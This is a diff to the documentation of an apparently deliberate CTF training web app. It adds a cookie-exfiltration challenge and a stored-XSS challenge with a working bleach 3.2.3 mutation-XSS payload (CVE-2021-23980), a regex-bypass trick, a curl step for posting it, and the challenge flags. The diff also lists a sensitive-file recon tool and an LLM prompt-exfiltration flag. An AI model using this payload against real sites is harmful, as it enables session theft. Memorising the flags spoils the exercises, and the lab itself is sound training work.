@@ -292,6 +292,8 @@ get_chat_system_prompt()        # → full system prompt string with embedded fl
 | `sqli_forgot` | `CTF{sql1_forg0t_p4ssw0rd_pwn3d}` | `api/auth.py` → `POST /auth/forgot-password`; raw SQL f-string sink in email lookup |
 | `idor_uuid_sandwich` | `CTF{1d0r_uu1d_s4ndw1ch_pwn3d}` | `api/tickets.py` → `GET /tickets/{uuid}`; no `user_id` ownership check; flag in hidden internal ticket |
 | `mass_assignment_plus` | `CTF{m4ss_4ss1gnm3nt_plus_pwn3d}` | `api/auth.py` → `POST /auth/upgrade-black` on successful mass-assignment bypass; also re-emitted by `GET /auth/me` for existing Plus members |
+| `puppeteer_mock_cookie` | `CTF{pUpp3t33r_c00k13_3xf1ltr4t10n}` | `api/ctf.py` → `POST /ctf/mock-flag-cookie`; set as JS-readable `mock_flag` cookie and in JSON body |
+| `stored_xss_bleach_mxss` | `CTF{5t0r3d_xss_bl34ch_mxss_CVE_2021_23980}` | `api/ratings.py` → `POST /ratings` review field; bleach 3.2.3 mXSS (CVE-2021-23980) + regex bypass via HTML entity encoding; rendered via `v-html` |
 | *(LLM)* | `FLAG{PR0MPT_3XF1LTR4T10N_SUCC3SS}` | `chat.system_prompt` in `flags.yml`; read by `api/chat.py` via `get_chat_system_prompt()` |
 
 > **Rule:** Always add the flag to `flags.yml` **first**, then wire the vulnerable endpoint to call `get_flag()`. Never hardcode flag strings in Python source files.
@@ -575,6 +577,115 @@ python solutions/idor-uuid-sandwich/solve.py --email user@example.com --password
 
 ---
 
+### Challenge 11 — Puppeteer Cookie Exfiltration
+
+| | |
+|---|---|
+| **Challenge ID** | `puppeteer_mock_cookie` |
+| **Category** | Web / Browser Automation / Cookie Security |
+| **Difficulty** | Easy–Medium |
+| **Flag** | `CTF{pUpp3t33r_c00k13_3xf1ltr4t10n}` |
+| **Vulnerable File** | [backend/app/api/ctf.py](backend/app/api/ctf.py) |
+| **Vulnerable Function** | `mock_flag_cookie()` |
+| **Vulnerable Sink** | `response.set_cookie(httponly=False, secure=False)` — flag stored in JS-readable, insecure cookie |
+| **CWE-315** | Cleartext Storage of Sensitive Information in a Cookie |
+| **CWE-614** | Sensitive Cookie in HTTPS Session Without 'Secure' Attribute |
+
+**How it works:** `POST /ctf/mock-flag-cookie` requires an admin JWT and then:
+1. Writes the flag value directly into a `mock_flag` cookie with `httponly=False` and `secure=False`.
+2. Also echoes the flag in the JSON response body.
+
+Any browser or HTTP client that holds a valid admin token can call this endpoint and extract the flag.
+Puppeteer is used to demonstrate that JS running in the browser can read the cookie via `document.cookie`.
+
+**Step 1 — get admin token:**
+```json
+POST /auth/login  { "email": "admin@…", "password": "…" }
+```
+
+**Step 2 — call the CTF endpoint:**
+```
+POST /ctf/mock-flag-cookie
+Authorization: Bearer <admin_token>
+```
+Response sets `Set-Cookie: mock_flag=CTF{...}` and returns `{"flag": "CTF{...}"}` in JSON.
+
+**Step 3 — confirm JS-readable (Puppeteer):**
+```js
+const cookies = await page.cookies('http://localhost:8001')
+// mock_flag.httpOnly === false  →  readable via document.cookie
+```
+
+**Solution folder:** [solutions/puppeteer-mock-cookie/](solutions/puppeteer-mock-cookie/)
+
+---
+
+### Challenge 12 — Stored XSS via bleach mXSS (CVE-2021-23980)
+
+| | |
+|---|---|
+| **Challenge ID** | `stored_xss_bleach_mxss` |
+| **Category** | Web / Stored XSS / Mutation XSS |
+| **Difficulty** | Hard |
+| **CVE** | [CVE-2021-23980](https://nvd.nist.gov/vuln/detail/CVE-2021-23980) (CVSS 6.1 MEDIUM) |
+| **Flag** | `CTF{5t0r3d_xss_bl34ch_mxss_CVE_2021_23980}` |
+| **Vulnerable File** | [backend/app/api/ratings.py](backend/app/api/ratings.py) |
+| **Renderer Sink** | `v-html="review.review"` in `ProductDetailView.vue` |
+| **CWE-79** | Improper Neutralisation of Input During Web Page Generation (XSS) |
+
+**How it works:**
+
+Product reviews are stored via `POST /ratings` and rendered raw via Vue’s `v-html` directive.
+The backend defends with **two layers** that must both be bypassed:
+
+1. **Regex pre-filter** — blocks `<script>`, `onerror=`, `onload=`, `onclick=`, `javascript:`, etc.
+   *Bypass:* HTML entity-encode the event handler name. `onerror=` → `on&#101;rror=` — the regex
+   never sees the literal string; html5lib decodes the entity during parsing, so the output contains `onerror=`.
+
+2. **bleach.clean() — CVE-2021-23980 (Mutation XSS)** — `bleach==3.2.3` is pinned.
+   The vulnerable config enables all four CVE trigger conditions simultaneously:
+   - `svg` / `math` in allowed tags (foreign-content namespace)
+   - `p` / `br` in allowed tags (auto-closing element)
+   - `style` / `title` / `noscript` in allowed tags (raw-text eject element)
+   - `strip_comments=False` (comment confusion trigger)
+
+   html5lib serialises the sanitised DOM back to HTML with a different structure than a browser
+   re-parses it — the **mutation** allows an event handler bleach tried to neutralise to escape
+   and execute.
+
+**Working payload (both layers bypassed):**
+
+```html
+<svg><!--<svg/--><p><style><!--</style><img src=x on&#101;rror=alert(document.cookie)></p></svg>
+```
+
+**Step 1 — post the review as an authenticated user with a delivered order:**
+```bash
+curl -X POST http://localhost:8001/ratings \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: Bearer <token>' \
+  -d '{"product_id":"<id>","rating":5,"review":"<PAYLOAD>"}'
+```
+
+**Step 2 — victim views the product page:**
+```
+GET /products/<product_id>  (any user session)
+```
+The mXSS fires; `document.cookie` (including JWT) is sent to the attacker.
+
+**Solution folder:** [solutions/stored-xss-bleach-mxss/](solutions/stored-xss-bleach-mxss/)
+
+```bash
+# Puppeteer (Node.js)
+cd solutions/puppeteer-mock-cookie && npm install
+node solve.js --email admin@example.com --password secret
+
+# Python fallback
+python solutions/puppeteer-mock-cookie/solve.py --email admin@example.com --password secret
+```
+
+---
+
 ### Challenge 10 — Mass Assignment via Plus Upgrade
 
 | | |
@@ -726,6 +837,8 @@ python solutions/<slug>/solve.py --email admin@example.com --password secret
 | [solutions/mass-assignment-plus/](solutions/mass-assignment-plus/) | `mass_assignment_plus` | Mass assignment via request body `setattr()` sink on `POST /auth/upgrade-black` → flag in JSON response |
 | [solutions/wallet-race-condition/](solutions/wallet-race-condition/) | `wallet_race` | Concurrent POST /wallet/redeem TOCTOU → multiply pending_cashback above ₹333 → purchase flag |
 | [solutions/sensitive-files-enum/](solutions/sensitive-files-enum/) | *(recon utility)* | Unauthenticated async probe of 175+ paths: `.git`, `.env`, cloud IMDS, backups, admin panels, API docs |
+| [solutions/puppeteer-mock-cookie/](solutions/puppeteer-mock-cookie/) | `puppeteer_mock_cookie` | Admin JWT → `POST /ctf/mock-flag-cookie` → JS-readable `mock_flag` cookie extracted by Puppeteer |
+| [solutions/stored-xss-bleach-mxss/](solutions/stored-xss-bleach-mxss/) | `stored_xss_bleach_mxss` | bleach 3.2.3 mXSS (CVE-2021-23980): entity-encode event handler to bypass regex, SVG+style+strip_comments=False mutation survives sanitiser → cookie theft |
 
 ---
 
@@ -874,6 +987,7 @@ python solutions/<slug>/solve.py --email admin@example.com --password secret
 | GET | `/robots.txt` | — | Returns `robots.txt` with `robots` flag embedded as a comment |
 | GET | `/flag.txt` | — ⚠️ | **SSRF target** — 403 for external callers; 200 + flag from loopback |
 | GET | `/flags/{challenge_id}` | — | Return any flag by challenge ID (dev/testing utility) |
+| POST | `/ctf/mock-flag-cookie` | 🔒🛡 ⚠️ | **[Cookie Exfiltration]** Sets `mock_flag` cookie (not `HttpOnly`) for admin callers; flag also in JSON body |
 | GET | `/health` | — | `{"status": "ok"}` |
 
 ---
